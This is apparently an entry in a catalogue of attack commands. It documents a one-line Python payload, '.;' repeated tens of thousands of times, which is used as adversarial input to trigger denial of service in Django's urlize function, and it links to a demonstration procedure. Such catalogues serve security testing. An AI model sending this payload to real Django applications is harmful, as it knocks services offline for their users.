---
id: cmd-uuid-6
data: PAYLOAD = ".;" * i
tags:
  - payload
  - dos
type: command
output: null
executor: python
platforms:
  - Python
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:02.921Z'
verified: false
validated: true
submitted: true
---
---

# generate-payload

## Command

```python
PAYLOAD = ".;" * i
```

## Description

Creates a string by repeating '.;' i times, where i is the loop variable, to form the adversarial input for urlize.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| i | Integer multiplier for repetition | Yes |

## Examples

### Basic Usage

```python
i = 40000
PAYLOAD = ".;" * i
```

## Expected Output

No output; PAYLOAD is a string of length 2*i, e.g., ';.' repeated 40,000 times for 80,000 chars.

## Related

- [[Related Procedure|procedures/Demonstrate-DoS-in-Django-urlize-with-Repeated-Payloads]]
